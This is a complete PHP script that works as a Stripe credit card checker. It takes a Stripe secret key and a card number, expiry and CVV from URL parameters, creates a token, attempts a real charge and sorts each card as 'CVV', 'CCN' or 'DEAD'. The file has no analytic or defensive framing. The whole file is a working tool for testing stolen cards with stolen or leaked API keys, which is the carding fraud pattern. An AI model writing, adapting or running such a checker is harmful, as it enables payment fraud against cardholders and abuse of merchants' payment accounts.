<?php

error_reporting(0);

if (empty($_GET['sk'])) {
    die('No SK specified');
}
if (empty($_GET['card'])) {
    die('No CC specified');
}
if (empty($_GET['currency'])) {
    $cur = 'USD';
} else {
    $cur = $_GET['currency'];
}
if (empty($_GET['amount'])) {
    $amount = '50';
} else {
    $amount = $_GET['amount'];
}

$sk = $_GET['sk'];
$cc = $_GET['card'];

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Authorization: Bearer '.$sk;
$headers[] = 'User-Agent: '.$_SERVER['HTTP_USER_AGENT'];

$card = explode('|', $cc)[0];
$month = explode('|', $cc)[1];
$year = explode('|', $cc)[2];
$cvv = explode('|', $cc)[3];

// --------------------- Req 1 ---------------------
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_POSTFIELDS, 'card[number]='.$card.'&card[exp_month]='.$month.'&card[exp_year]='.$year.'&card[cvc]='.$cvv);
$response = curl_exec($curl);

if (strpos($response, '"error":')) {
    $message = json_decode($response, true)['error']['message'];
    $code = json_decode($response, true)['error']['code'];
    if ($code == 'testmode_charges_only') {
        die('DEAD - '.$cc.' - '.$code.' - SK Fucked!');
    } else {
        die('DEAD - '.$cc.' - '.$code.' - '.$message);
    }
} else {
    $token = json_decode($response, true)['id'];
}

// --------------------- Req 2 ---------------------
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency='.$cur.'&source='.$token);
$response = curl_exec($curl);

if (strpos($response, '"error":')) {
    $message = json_decode($response, true)['error']['message'];
    if (strpos($response, '"decline_code":')) {
        $code = json_decode($response, true)['error']['decline_code'];
    } else {
        $code = json_decode($response, true)['error']['code'];
    }
    if ($code == 'incorrect_cvc') {
        die('CCN - '.$cc.' - '.$code.' - '.$message);
    } elseif ($code == 'insufficient_funds') {
        die('CVV - '.$cc.' - '.$code.' - '.$message);
    } else {
        die('DEAD - '.$cc.' - '.$code.' - '.$message);
    }
} elseif (strpos($response, '"status": "succeeded"')) {
    $receipt = json_decode($response, true)['receipt_url'];
    $receipt = '<a href="'.$receipt.'">Receipt</a>';
    die('CVV - '.$cc.' - Approved - '.$receipt);
}

?>